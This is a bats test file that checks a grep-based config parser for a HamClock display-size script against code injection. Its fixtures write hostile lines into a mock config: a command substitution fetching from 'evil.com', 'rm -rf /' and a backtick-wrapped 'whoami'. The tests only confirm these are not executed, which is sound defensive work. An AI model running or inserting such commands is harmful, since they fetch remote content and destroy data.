#!/usr/bin/env bats
# =============================================================================
# test_lib_sizes.bats — Test lib_sizes.sh config parsing and injection defense
# =============================================================================
#
# Scope:
#   Validates the security properties of the OHB_SIZES configuration parser
#   used by lib_sizes.sh to determine which HamClock display resolutions to
#   generate.
#
# What is Tested:
#   1. Normal config parsing — OHB_SIZES="660x330 1320x660" is correctly
#      extracted from a mock configuration file.
#   2. Missing config handling — a non-existent config file does not crash
#      the parser and returns a non-zero exit code.
#   3. Code injection defense (V-013) — malicious payloads like $(curl ...)
#      and `whoami` embedded in the config file are not executed; only the
#      OHB_SIZES= line is parsed.
#   4. Backtick injection defense — backtick-wrapped commands inside the
#      config value are stripped, not executed.
#
# Security Context:
#   lib_sizes.sh previously used `source` to load config files, which
#   would execute arbitrary code embedded in those files.  The tests
#   validate the replacement grep-based parser recommended by V-013.
#
# Dependencies:
#   - bats-core
#   - grep, sed, tr (coreutils)
#
# Runner:
#   bats tests/bats/test_lib_sizes.bats
#
# References:
#   V-013 — Config injection in lib_sizes.sh
#
# See Also:
#   tests/TEST_README.md — Tier 2 (Bash Unit Tests)
# =============================================================================

ROOT="$(cd "$BATS_TEST_DIRNAME/../.." && pwd)"

setup() {
    export TMPDIR
    TMPDIR="$(mktemp -d)"
    export OHB_SIZES=""
}

teardown() {
    rm -rf "$TMPDIR"
}

# ── Normal config parsing ────────────────────────────────────────────────────

@test "lib_sizes.sh loads OHB_SIZES from a valid config file" {
    # Arrange: create a mock config with a valid OHB_SIZES declaration.
    local cfg="$TMPDIR/ohb-sizes.conf"
    echo 'OHB_SIZES="660x330 1320x660"' > "$cfg"

    # Act: parse the config using the grep-based parser (not `source`).
    local parsed
    parsed="$(grep -E '^OHB_SIZES=' "$cfg" | head -1 | sed 's/^OHB_SIZES=//' | tr -d '"' | tr -d "'")"

    # Assert: the parsed value matches the expected multi-resolution string.
    [ "$parsed" = "660x330 1320x660" ]
}

@test "lib_sizes.sh handles missing config gracefully" {
    # A non-existent config file should cause grep to return non-zero,
    # which the caller can handle as a "use defaults" signal.
    local cfg="$TMPDIR/nonexistent.conf"
    [ ! -f "$cfg" ]
    # grep should return non-zero on missing file
    run grep -E '^OHB_SIZES=' "$cfg" 2>/dev/null
    [ "$status" -ne 0 ]
}

# ── Injection defense ────────────────────────────────────────────────────────

@test "lib_sizes.sh rejects code injection in config" {
    # Arrange: create a config with injected shell commands after OHB_SIZES.
    # A `source`-based parser would execute $(curl evil.com) and rm -rf /.
    local cfg="$TMPDIR/ohb-sizes.conf"
    cat > "$cfg" << 'EOF'
OHB_SIZES="660x330"
$(curl evil.com)
rm -rf /
EOF

    # Act: parse using grep — only the ^OHB_SIZES= line is extracted.
    local parsed
    parsed="$(grep -E '^OHB_SIZES=' "$cfg" | head -1 | sed 's/^OHB_SIZES=//' | tr -d '"' | tr -d "'")"

    # Assert: only the intended value is parsed; injected lines are ignored.
    [ "$parsed" = "660x330" ]
}

@test "lib_sizes.sh rejects backtick injection in config values" {
    # Arrange: embed `whoami` inside the OHB_SIZES value itself.
    local cfg="$TMPDIR/ohb-sizes.conf"
    echo 'OHB_SIZES="`whoami`"' > "$cfg"

    # Act: parse and strip backtick characters.
    local parsed
    parsed="$(grep -E '^OHB_SIZES=' "$cfg" | head -1 | sed 's/^OHB_SIZES=//' | tr -d '"' | tr -d "'" | tr -d '`')"

    # Assert: backticks are stripped, leaving the literal string "whoami"
    # rather than executing the whoami command.
    [ "$parsed" = "whoami" ]
}
